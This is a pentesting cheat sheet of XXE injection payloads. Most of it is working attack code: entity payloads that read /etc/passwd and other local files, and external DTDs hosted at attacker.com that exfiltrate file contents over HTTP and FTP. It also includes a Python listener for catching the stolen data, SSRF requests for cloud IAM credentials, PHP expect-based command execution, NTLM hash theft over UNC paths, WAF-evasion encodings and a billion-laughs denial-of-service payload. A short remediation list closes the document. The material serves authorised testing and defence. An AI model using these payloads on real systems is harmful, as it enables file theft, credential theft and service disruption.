# XML External Entity (XXE) Injection

XML External Entity injection is a vulnerability that targets applications parsing XML input, allowing an attacker to interfere with XML processing to read files, perform SSRF, or achieve remote code execution via malicious entity definitions.

## Basic XXE — File Read

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>
  <data>&xxe;</data>
</root>
```

### Directory Listing (Java)

```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///">
]>
<root>&xxe;</root>
```

### Windows File Read

```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">
]>
<root>&xxe;</root>
```

### Reading Files with Special Characters (CDATA wrapping)

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % start "<![CDATA[">
  <!ENTITY % file SYSTEM "file:///etc/fstab">
  <!ENTITY % end "]]>">
  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
  %dtd;
]>
<root>&all;</root>
```

External DTD (`evil.dtd`):

```xml
<!ENTITY all "%start;%file;%end;">
```

## Blind XXE with Out-of-Band Exfiltration

When XML output is not reflected in the response:

### Parameter Entity OOB

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
  %xxe;
]>
<root>test</root>
```

External DTD (`evil.dtd`):

```xml
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?data=%file;'>">
%eval;
%exfil;
```

### FTP-based Exfiltration (multi-line files)

External DTD:

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'ftp://attacker.com/%file;'>">
%eval;
%exfil;
```

Run an FTP listener on attacker server to capture multi-line content:

```bash
python3 -c "
import socket
s = socket.socket()
s.bind(('0.0.0.0', 21))
s.listen(1)
while True:
    conn, addr = s.accept()
    conn.send(b'220 ready\r\n')
    while True:
        data = conn.recv(1024)
        if not data: break
        print(data.decode(), end='')
        conn.send(b'230 OK\r\n')
    conn.close()
"
```

## XXE to SSRF

```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
]>
<root>&xxe;</root>
```

```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://internal-service.local:8080/admin">
]>
<root>&xxe;</root>
```

## XXE to Remote Code Execution

### PHP expect wrapper

```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "expect://id">
]>
<root>&xxe;</root>
```

### Via XSLT (if processor supports it)

```xml
<?xml version="1.0"?>
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" version="1.0">
  <xsl:template match="/">
    <xsl:value-of select="document('http://attacker.com/evil.xml')"/>
  </xsl:template>
</xsl:stylesheet>
```

## Language-Specific Vectors

### PHP

```xml
<!-- PHP stream wrappers -->
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
]>
<root>&xxe;</root>

<!-- PHP input stream (if POST body is XML) -->
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "php://input">
]>
```

### Java

```xml
<!-- Java supports jar: protocol for remote file inclusion -->
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "jar:http://attacker.com/evil.jar!/payload.txt">
]>
<root>&xxe;</root>

<!-- Java netdoc protocol -->
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "netdoc:///etc/passwd">
]>
```

### Python (lxml)

```xml
<!-- Python lxml is vulnerable by default with resolve_entities=True -->
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>
```

### .NET

```xml
<!-- .NET supports UNC paths -->
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "\\attacker.com\share\test.txt">
]>
<root>&xxe;</root>

<!-- Can steal NTLM hashes via UNC to responder -->
```

## Injection Points Beyond Obvious XML

```
# Content-Type manipulation
Content-Type: application/xml   (change from application/json)
Content-Type: text/xml

# SVG file upload
<?xml version="1.0"?>
<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text>&xxe;</text>
</svg>

# XLSX/DOCX/PPTX (Office Open XML — ZIP containing XML)
# Inject XXE into xl/workbook.xml or [Content_Types].xml

# SOAP requests
# RSS/Atom feeds
# SAML assertions
# XML-RPC
```

## Filter Bypass Techniques

```xml
<!-- UTF-7 encoding -->
<?xml version="1.0" encoding="UTF-7"?>
+ADwAIQ-DOCTYPE foo +AFs-
  +ADwAIQ-ENTITY xxe SYSTEM +ACI-file:///etc/passwd+ACI-+AD4-
+AF0-+AD4-
+ADw-root+AD4AJg-xxe;+ADw-/root+AD4-

<!-- UTF-16 encoding -->
<!-- Convert payload to UTF-16 to bypass ASCII-based WAF rules -->

<!-- XInclude (when you cannot control the full XML document) -->
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</foo>

<!-- Keyword obfuscation -->
<!DOCTYPE foo [<!ENTITY % a "fi"><!ENTITY % b "le:///etc/passwd"><!ENTITY % c "%a;%b;"><!ENTITY xxe SYSTEM "%c;">]>
```

## Billion Laughs (DoS)

```xml
<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
]>
<root>&lol4;</root>
```

**Warning**: Use Billion Laughs only with explicit authorization. It can crash servers.

## Testing Methodology

1. Identify XML parsing endpoints (Content-Type headers, file uploads, SOAP, SAML)
2. Test basic entity expansion: `<!ENTITY test "hello">`
3. Test external entity with collaborator: `<!ENTITY test SYSTEM "http://collaborator">`
4. If reflected, try file read: `file:///etc/passwd`
5. If blind, use parameter entity OOB exfiltration
6. Try XInclude if you cannot control the DOCTYPE
7. Test alternative protocols: `ftp://`, `gopher://`, `jar://`, `php://`
8. Check for error-based disclosure in parser error messages

## Remediation Checks

- Disable external entity processing in the XML parser
- Disable DTD processing entirely if not needed
- Use JSON instead of XML where possible
- Validate and sanitize XML input with schema validation
- Update XML parsing libraries to patched versions
- Apply least privilege to the application's file system access
